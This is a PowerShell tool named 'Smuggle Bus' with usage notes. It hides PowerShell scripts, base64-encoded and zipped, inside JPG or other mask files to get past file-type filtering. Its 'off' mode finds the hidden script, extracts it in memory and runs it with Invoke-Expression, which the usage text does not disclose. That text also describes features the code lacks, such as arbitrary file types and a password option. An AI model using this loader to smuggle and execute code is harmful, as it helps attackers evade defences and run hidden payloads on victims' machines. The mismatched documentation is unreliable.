# smuggle bus

<## About

Welcome to Smuggle Bus, your ultimate (or at least pretty good) file type bypass tool

Smuggle Bus was created by Jason Caminsky

This tool was created purely for education, research, and legitimate use--if you do bad things with it, it's on you

Features remaining to be implemented:
	- auto upload (need to figure out a reliable way to do this--with lots of different auth types this might be tricky)
	- bash implementation (with mutual compatibility--smuggle buses created with powershell should be extractable via bash, and vice versa)

##>

<## Usage Instructions

Smuggle Bus takes "contraband" file(s) you specify and embed into a random jpg or other file you specify, or it extracts a file so embedded. You also have the option of creating an encrypted archive for one or more contraband files for enhanced obfuscation. The combination of mask file + embedded file is known in this script as a "smuggle bus".

Here is a detailed summary of parameters:
 	-mode : enter either on or off.	On mode embeds files. Off mode extracts them
 	-contraband : in On mode, this is the path to the file(s) you want to embed into your image mask. Supports wildcards (ex C:\path\*.xlsx). No function in Off mode
 	-busPath : Default current directory. This specifies where your smuggle buses will come out (in On mode) or where your smuggle buses to be extracted are (in Off mode)
	-outpath : Default current directory. This specifies where your extracted files will come out (in Off mode). No function in On mode
 	-archive : Default $false, supply value $true to enable. Option to zip up contraband file(s) in an encrypted archive in On mode. No function in Off mode. NOTE: archiving requires either 7zip or winRAR on host
	-archivePassword: Default get-random. The password used to encrypt the archive if archive is enabled
 	-maskFile : Default random jpg. Option to specify a specific file you want to embed your contraband file(s) in On mode. No function in Off mode
	-label : in Off mode, this is the label Smuggle Bus will use to find and extract smuggle buses in the busPath. Supports multiple labels separated by a comma (ex. -label 123,234,345). No function in On mode

 Here are some examples of useage:
	 * .\smuggle_bus.ps1 -mode on -contraband "C:\Path\to\File.exe" : Will embed File.exe into a random jpg and deposit it in current directory
	 * .\smuggle_bus.ps1 -mode on -contraband "C:\Path\to\File.exe" -busPath "C:\Other\Path\" :	Will embed File.exe into a random jpg and deposit it at C:\Other\Path\
	 * .\smuggle_bus.ps1 -mode on -contraband "C:\Path\to\File.exe" -busPath "C:\Other\Path\" -archive $true : Will archive File.exe into a randomly named zip file protected by a random password, then embed it into a random jpg and deposit it at C:\Other\Path\
	 * .\smuggle_bus.ps1 -mode on -contraband "C:\Path\to\*.xlsx" -busPath "C:\Other\Path\" -archive $true -archivePassword "wahoo" -maskFile "C:\path\to\mask\jamz.mp4 : Will archive all xlsx files in C:\Path\to\ directory into a randomly named zip file protected by the password "wahoo", then embed it into C:\path\to\mask\jamz.mp4 and deposit it at C:\Other\Path\
	 
	 * .\smuggle_bus.ps1 -mode off -label 123 : Will search current directory for all files labeled with 123 and attempt to extract the embedded file
	 * .\smuggle_bus.ps1 -mode off -busPath "C:\Other\Path\" -label 123 : Will search C:\Other\Path\ for any files labeled with 123 and attempt to extract the embedded file into the current directory
	 * .\smuggle_bus.ps1 -mode off -busPath "C:\Other\Path\" -outPath "C:\Still\another\Path\" -label 123 : Will search C:\Other\Path\ for any files labeled with 123 and	attempt to extract the embedded file into C:\Still\another\Path\
	 
Basic Smuggle Bus Useage is as follows:

	 .\smuggle_bus.ps1 -mode [on/off] -contraband [path to file/file(s) to smuggle] -busPath [path for smuggle buses; default is CWD] -outPath [path for extracted files; default is CWD] -archive [set to $true to enable archive mode] -archivePassword [password for encrypted archive; default is random password] -maskFile [specific mask file you want to use; default is random jpg] -label [smuggle bus file label] 
	 
Manipulate Zip file in memory: https://stackoverflow.com/questions/25143435/is-there-a-way-of-manipulating-zip-file-contents-in-memory-with-powershell

##>

## code

### params

Param (
	[string]$mode, # mask on / mask off mode switch
	[string]$contraband, # file(s) we're hiding
	[int32[]]$label, # the label(s) hidden inside smuggle buses that we use to recognize and extract them
	[string]$busPath=".\", # path in which to look for files
	[string]$outPath=".\", # path to output extracted files in off mode
	[string]$maskFile # option to specify a particular mask file
)

$archive = "a"
write-host "`n`n"

### mask on filters

if (($mode -eq "on") -and (!$contraband)) {
	write-host "!!! When using mask on mode, you must specify a -contraband file`n"
	break
}

if (($mode -eq "on") -and ($contraband) -and ($contraband -NotMatch ".ps1")) {
	write-host "!!! Contraband file must be a powershell script`n"
	break
}

if (($mode -eq "on") -and ($maskFile) -and ((Get-ChildItem $maskFile).Length -lt 16000)) {
	write-host "!!! The minimum size for a mask file is 16,000 bytes`n"
	break
}

if (($mode -eq "on") -and ($archive)) {
		
		$chars = "abcdefghijkmnopqrstuvwxyzABCEFGHJKLMNPQRSTUVWXYZ23456789()_-,()_-,()_-,()_-,()_-,".ToCharArray()
		$charsEnd = "abcdefghijkmnopqrstuvwxyzABCEFGHJKLMNPQRSTUVWXYZ23456789".ToCharArray()
		$random=""
		$random2=""
		$random3 = ""
		1..10 | ForEach {  $random+= $chars | Get-Random }
		$random+= $charsEnd | Get-Random
		1..10 | ForEach {  $random2+= $chars | Get-Random }
		$random2+= $charsEnd | Get-Random
		
		$archiveFile = "$busPath\$random"
		$stageFile = "$busPath\$random2"
		$powershellScriptEncodedBytes = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content $contraband)))
		Set-Content -Path "$stageFile" -Value $powershellScriptEncodedBytes
		Start-Sleep -Seconds 3
		Compress-Archive -Path "$stageFile" -DestinationPath "$archiveFile`.zip"
		Rename-Item -Path "$archiveFile`.zip" -NewName "$archiveFile"

		$contraband = (Get-ChildItem "$archiveFile").FullName
		write-host "*** archive file $archiveFile created"

}

### mask on

if ($mode -eq "on") {

#### prep

	$mask=""  # random jpg
	$contrabandCheck="" # check for presence of face file
	$contrabandLength="" # length of the file we're hiding
	$contrabandName="" # name of the file we're hiding
	$newName="" # name of combined random jpg and hidden file
	$embeddedFile="" # contents of the hidden file
	[byte]$combined="" # combined contents of random jpg and hidden file
	[byte]$nullByte = 0x00

#### action
	$contrabandFiles=@()
	$contrabandFiles += (Get-Childitem $contraband).FullName
	
	if (!$contrabandFiles) {
		write-host "XXX Specified contraband file not found"
		break
	} else {
		
		ForEach ($f in $contrabandFiles) {
			
			if (!$maskFile) {
				$mask = invoke-webrequest -Uri "https://picsum.photos/500"
				$mask = $mask.content
				$newName = Get-Random
				$newName = "$newName`.jpg"
				$newName = "$busPath\$newName"
				$mask | set-content -encoding byte -Path $newName
			} else {
				$mask = Get-Content -encoding byte $maskFile
				$newName = (Get-ChildItem $maskFile).Name
				$newName = "$busPath\$newName"
				copy $maskFile $newName
			}
						
			$contrabandLength = (Get-ChildItem $f).Length
			$contrabandName = (Get-ChildItem $f).BaseName
			$contrabandName += (Get-ChildItem $f).Extension
			$contrabandExtension = (Get-ChildItem $f).Extension

			$embeddedFile = get-content -encoding byte $f

			$maskLength = (Get-ChildItem $newName).Length
			$combinedLength = $maskLength*$contrabandLength
			
#### begin label config
			
			#$1key = $contrabandLength
			#$2key = $contrabandLength*2
			#$3key = $contrabandLength*3
			#$4key = $contrabandLength*4
			#$5key = $contrabandLength*5
			#$6key = $contrabandLength*6
			$7key = $contrabandLength*7
			#$8key = $contrabandLength*8
			#$9key = $contrabandLength*9
			
			#$11key = $contrabandLength
			#$22key = $contrabandLength*2
			#$33key = $contrabandLength*3
			#$44key = $contrabandLength*4
			$55key = $contrabandLength*5
			#$66key = $contrabandLength*6
			$77key = $contrabandLength*7
			#$88key = $contrabandLength*8
			#$99key = $contrabandLength*9
			
			$key = "$1key$2key$3key$4key$5key$6key$7key$8key$9key"
			$keyHash = (Get-FileHash -InputStream ([System.IO.MemoryStream]::New([System.Text.Encoding]::ASCII.GetBytes($key)))).Hash
			$key = $keyHash.Substring(0,3)
			$key += $keyHash.Substring(($keyHash.length - 5),3)
			$key2 = "$11key$22key$33key$44key$55key$66key$77key$88key$99key"
			$key2Hash = (Get-FileHash -InputStream ([System.IO.MemoryStream]::New([System.Text.Encoding]::ASCII.GetBytes($key2)))).Hash
			$key2 = $key2Hash.Substring(0,3)
			$key2 += $key2Hash.Substring(($key2Hash.length - 5),3)
			
#### end label config			
			
			$insert = "$random!$random2"
			$insertEncoded = $insert
			$insertArray = $insertEncoded -split '(?<=\D)(?=\d)'
			1..24|%{[byte](Get-Random -Minimum ([byte]::MinValue) -Maximum ([byte]::MaxValue))} | add-content -Path $newName -encoding byte -NoNewLine
			$key | add-content -NoNewLine -Path $newName
			1..4|%{[byte](Get-Random -Minimum 0 -Maximum 30)} | add-content -Path $newName -encoding byte -NoNewLine
			
			ForEach ($i in $insertArray) {
				$i | add-content -NoNewLine -Path $newName
				1..4|%{[byte](Get-Random -Minimum 0 -Maximum 30)} | add-content -Path $newName -encoding byte -NoNewLine
			}
			
			1..4|%{[byte](Get-Random -Minimum 0 -Maximum 30)} | add-content -Path $newName -encoding byte -NoNewLine
			$key2 | add-content -NoNewLine -Path $newName
			1..52|%{[byte](Get-Random -Minimum ([byte]::MinValue) -Maximum ([byte]::MaxValue))} | add-content -Path $newName -encoding byte -NoNewLine			
			$embeddedFile | add-content -encoding byte -Path $newName  # we now have a jpg that contains our face file
			$mask | select -last 16000 | add-content -encoding byte -Path $newName

			$combinedFilePath = (Get-ChildItem $newName).FullName
			write-host "*** $contrabandName has boarded the smuggle bus $combinedFilePath`nTo extract it, use -label $contrabandLength"
			
			if ($archive) {
				del "$archiveFile"
				del "$stageFile"
			}
		}
	}
	
	write-host "`n`n"
	
}

## mask off filters

if (($mode -eq "off") -and (!$label)) {
	write-host "!!! You must specify a file label (or omit parameter--default value is `"smug`")`n"
	break
}

if (($mode -eq "off") -and ($label -match " ")) {
	write-host "!!! Label contains spaces--this is not permitted by script. Please use label without spaces`n"
	break
}

if (($mode -eq "off") -and (!$busPath)) {
	write-host "!!! When using mask off mode, you must specify a -path`n"
}

## mask off

if ($mode -eq "off") {

### prep

	$combinedFiles=@() # an array to store all labelled files
	$combinedFileName=""
	$contrabandFileName=""
	$fileLength=""
	$key=""
	
#### extract from zip in memory

function Extract-FileFromInMemoryZip
{
    [CmdletBinding(DefaultParameterSetName = 'raw')]
    [OutputType([string], ParameterSetName = 'utf8')]
    [OutputType([byte[]], ParameterSetName = 'raw')]
    param
    (
        [Parameter(Mandatory, ValueFromPipelineByPropertyName, Position = 0,
                   HelpMessage = 'Byte array containing zip file')]
        [byte[]]$ByteArray,
        [Parameter(Mandatory, ValueFromPipelineByPropertyName, Position = 1,
                   HelpMessage = 'Single file to extract')]
        [string]$FileInsideZipIWant,
        [Parameter(ParameterSetName = 'utf8')]
        [switch]$utf8
    )

    BEGIN { Add-Type -AN System.IO.Compression -ea:Stop } # Stop on error

    PROCESS {
        $entry = (
            New-Object System.IO.Compression.ZipArchive(
                New-Object System.IO.MemoryStream ( ,$ByteArray)
            )
        ).GetEntry("$FileInsideZipIWant")

        # Note ZipArchiveEntry.Length returns a long (rather than int),
        # but we can't conveniently construct arrays longer than System.Int32.MaxValue
        $b = [byte[]]::new($entry.Length)

        # Avoid StreamReader to (dramatically) improve performance
        # ...but it may be useful if the extracted file has a BOM header
        $entry.Open().Read($b, 0, $b.Length)

        write $(
            if ($utf8) { [System.Text.Encoding]::UTF8.GetString($b) }
            else { $b }
        )
    }
}


	
### action
	
	ForEach ($contrabandLength in $label) {
		
#### begin label config
			
			#$1key = $contrabandLength
			#$2key = $contrabandLength*2
			#$3key = $contrabandLength*3
			#$4key = $contrabandLength*4
			#$5key = $contrabandLength*5
			#$6key = $contrabandLength*6
			$7key = $contrabandLength*7
			#$8key = $contrabandLength*8
			#$9key = $contrabandLength*9
			
			#$11key = $contrabandLength
			#$22key = $contrabandLength*2
			#$33key = $contrabandLength*3
			#$44key = $contrabandLength*4
			$55key = $contrabandLength*5
			#$66key = $contrabandLength*6
			$77key = $contrabandLength*7
			#$88key = $contrabandLength*8
			#$99key = $contrabandLength*9
			
			$key = "$1key$2key$3key$4key$5key$6key$7key$8key$9key"
			$keyHash = (Get-FileHash -InputStream ([System.IO.MemoryStream]::New([System.Text.Encoding]::ASCII.GetBytes($key)))).Hash
			$key = $keyHash.Substring(0,3)
			$key += $keyHash.Substring(($keyHash.length - 5),3)
			$key2 = "$11key$22key$33key$44key$55key$66key$77key$88key$99key"
			$key2Hash = (Get-FileHash -InputStream ([System.IO.MemoryStream]::New([System.Text.Encoding]::ASCII.GetBytes($key2)))).Hash
			$key2 = $key2Hash.Substring(0,3)
			$key2 += $key2Hash.Substring(($key2Hash.length - 5),3)
			
#### end label config
		
		$combinedFiles=@()
		
		$combinedFiles += ((Get-ChildItem $busPath\* | select-string $key).Path | Get-ChildItem | select-string $key2).Path
	
		if (!$combinedFiles) {
			write-host "XXX No files with label (`"$contrabandLength`") found`n"
		} else {

			ForEach ($f in $combinedFiles) {
				$combinedBytes = get-content -encoding byte -Path $f
				$combinedContent = get-content -Path $f
				$combinedFileName = (get-childitem $f).Name
				$combinedFileLength = (get-childitem $f).Length
				$pattern = "$key(.*)$key2"
				$extractRaw = ([regex]::match($combinedContent,$pattern).Groups[1].Value)
				$extractTrim = $extractRaw.Trim()
				$extractTrim = $extractTrim -replace "[^ -x7e]",""
				#$extractDecoded = [System.Text.Encoding]::Unicode.Getstring([System.Convert]::FromBase64String($extractTrim))
				$stageFile = $extractTrim.Split("!") | select -index 1
				$stageFile = $stageFile.Trim()
				
				$fileLength = $contrabandLength
			
				$archiveBytes = [byte[]]($combinedBytes | select -last ($fileLength + 16000) | select -first $fileLength)
				$powershellScriptEncodedBytes = Extract-FileFromInMemoryZip $archiveBytes -FileInsideZipIWant "$stageFile" -utf8
				$powershellScriptEncodedBytes = $powershellScriptEncodedBytes | select -skip 1
				$powershellDecoded = [System.Text.Encoding]::Unicode.Getstring([System.Convert]::FromBase64String($powershellScriptEncodedBytes))

				Invoke-Expression $powershellDecoded
			
			}
		}
	}
	
	write-host "`n`n"
	
}